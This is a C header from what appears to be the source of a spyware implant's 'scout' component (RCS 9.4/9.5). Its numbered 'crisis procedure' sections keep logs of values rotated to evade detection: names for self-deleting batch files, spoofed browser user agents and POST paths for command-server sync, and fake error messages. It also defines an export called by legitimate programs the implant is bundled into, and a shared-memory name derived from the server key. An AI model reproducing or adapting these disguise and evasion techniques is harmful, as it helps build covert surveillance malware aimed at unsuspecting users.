#ifndef _VERSION_H_
#define _VERSION_H_

//  ------------- PUNTO 1 CRISIS PROCEDURE - BUILD VERSION------

#define BUILD_VERSION 13


/*  ------------- PUNTO 2 CRISIS PROCEDURE - BATCH FILE -------- 

	BATCH_FILE HISTORY

	98355.bat	
	02322.bat	
	76833.bat

(RCS 9.4) 437890.bat
(RCS 9.4) 124904.bat
(RCS 9.4) 391294.bat

(RCS 9.5) 9348690.bat
(RCS 9.5) 4204902.bat
(RCS 9.5) 6913291.bat

*/

#define BATCH_FILE_1  L"3984096.bat"	//DeleteAndDie			in file main.cpp
#define BATCH_FILE_2  L"2094402.bat"	//CreateDeleteBatch		in file main.cpp
#define BATCH_FILE_3  L"1926319.bat"	//CreateReplaceBatch	in file main.cpp

/* 	------------- PUNTO 3 CRISIS PROCEDURE - USER_AGENT--------- 

	USER_AGENT HISTORY

			Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0
			Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716	
			Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)	
(RCS 9.4)	Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3
(RCS 9.5)   Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0
*/
			
#define USER_AGENT L"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"


/* 	------------- PUNTO 4 CRISIS PROCEDURE - URL SYNC ----------

	POST_PAGE HISTORY
	
			/rss.asp
(RCS 9.4)	/home.php
(RCS 9.5)   /default.asp
*/

#define POST_PAGE  L"/index.php"


/*  ------------- PUNTO 5 CRISIS PROCEDURE - FAKE STRINGS ------

	STRINGS HISTORY

	MSG_1 L"wrong commandline arguments"
	MSG_2 L"Trying to recover.."
	MSG_3 L"Aborting now"
	MSG_4 L"Not sure what's happening"

	(RCS 9.5)
	MSG_1	L"Creating the process heap failed" 
	MSG_2	L"Not enough memory to complete"
	MSG_3	L"Allocating a buffer to hold the current working directory failed"
	MSG_4	L"corrupted critical section"
*/
#define MSG_1	L"Failed to open file" 
#define MSG_2	L"Invalid argument"
#define MSG_3	L"Error reading data"
#define MSG_4	L"Insufficient buffer size"

PCHAR GetScoutSharedMemoryName();

//use only in one file
#ifdef _GLOBAL_VERSION_FUNCTIONS_

extern BYTE pServerKey[32];
extern BYTE pConfKey[32];
extern BYTE pSessionKey[20];
extern BYTE pLogKey[32];
extern BOOL bLastSync;

BOOL	uMelted = FALSE;
PULONG	uSynchro;

/* 	------------- PUNTO 6 CRISIS PROCEDURE - EXPORT NAME -------

	EXPORT HISTORY
			jfk31d1QQ
			reuio841001a
			pqjjslanf
			robertlee
(RCS 9.4)	eflmakfil
(RCS 9.5)   hardreset
*/


PWCHAR expprochd(PULONG pSynchro) // questa viene richiamata dai meltati
{
#ifdef _DEBUG
	OutputDebugString(L"[+] Setting uMelted to TRUE\n");
#endif
	
	PWCHAR pScoutName;
	
	uMelted = TRUE;
	uSynchro = pSynchro;

	pScoutName = (PWCHAR)VirtualAlloc(NULL, strlen(SCOUT_NAME)*sizeof(WCHAR) + 2*sizeof(WCHAR), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, SCOUT_NAME, strlen(SCOUT_NAME), pScoutName, strlen(SCOUT_NAME) + 2);

	return pScoutName;
}

/*  ------------- PUNTO 7 CRISIS PROCEDURE - SHARED MEMORY -----

	SHARED MEMORY HISTORY

			pServerKey[6], pServerKey[5], pServerKey[4], pServerKey[3], pServerKey[2], pServerKey[1], pServerKey[0]
(RCS 9.4)	pServerKey[5], pServerKey[6], pServerKey[5], pServerKey[3], pServerKey[4], pServerKey[2], pServerKey[1], pServerKey[0], pServerKey[2]
(RCS 9.5)   pServerKey[4], pServerKey[2], pServerKey[5], pServerKey[3], pServerKey[4], pServerKey[1], pServerKey[0], pServerKey[3]
*/

PCHAR GetScoutSharedMemoryName()
{
	CHAR strFormat[] = { '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '\0' };
	PCHAR pName = (PCHAR) malloc(20);
	if(pName == NULL)
		return NULL;

	memset(pName, 0x0, 20);

	_snprintf_s(pName, 
		20, 
		_TRUNCATE, 
		strFormat, 		
		pServerKey[2], pServerKey[4], pServerKey[3], pServerKey[5], pServerKey[4], pServerKey[0], pServerKey[1]);

	return pName;
}

#endif


#endif